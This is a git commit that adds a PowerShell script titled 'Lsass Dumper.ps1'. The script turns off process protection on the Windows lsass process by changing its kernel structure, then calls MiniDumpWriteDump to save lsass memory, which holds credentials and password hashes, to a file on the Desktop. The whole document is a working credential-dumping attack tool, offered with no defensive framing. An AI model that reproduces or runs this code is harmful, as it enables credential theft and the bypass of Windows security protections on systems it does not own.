5eeddcdadc5b8c30761a0fcdbe34cec5686b9e99
Dark Monkey <295954973+v8k6b2jjps-prog@users.noreply.github.com>
2026-08-30 18:03:50 +0300

    Add files via upload

---
+++ Extra/Lsass Dumper.ps1
@@ -0,0 +1,25 @@
+﻿Import-Module NativeInteropLib -ErrorAction Stop
+
+Clear-Host
+Write-Host
+
+if (-not $Proc) {
+    $Proc     = [System.Diagnostics.Process]::GetProcessesByName("lsass")[0]
+    $Size     = $Proc.Modules | ? FileName -Match lsasrv.dll | select -ExpandProperty Size
+    $ProcId   = $Proc.Id
+    $hProcess = $Proc.Handle
+}
+
+$eProc = Query-EprocessStruct -ProcessID $ProcId
+Update-ProcessProtection -Eprocess $eProc -SignerValue None -TypeValue None | Out-Null
+
+Set-Location ([Environment]::GetFolderPath("Desktop"))
+$fs = [System.IO.File]::Create("$PWD\lsass.dmp")
+
+try {
+    $Values = $hProcess, $ProcId, ($fs.SafeFileHandle.DangerousGetHandle()), [int32]2, 0L, 0L, 0L
+    Invoke-UnmanagedMethod -Dll dbgcore.dll -Function MiniDumpWriteDump -Values $Values -Return bool
+}
+finally {
+    if ($fs) { $fs.Close() }
+}
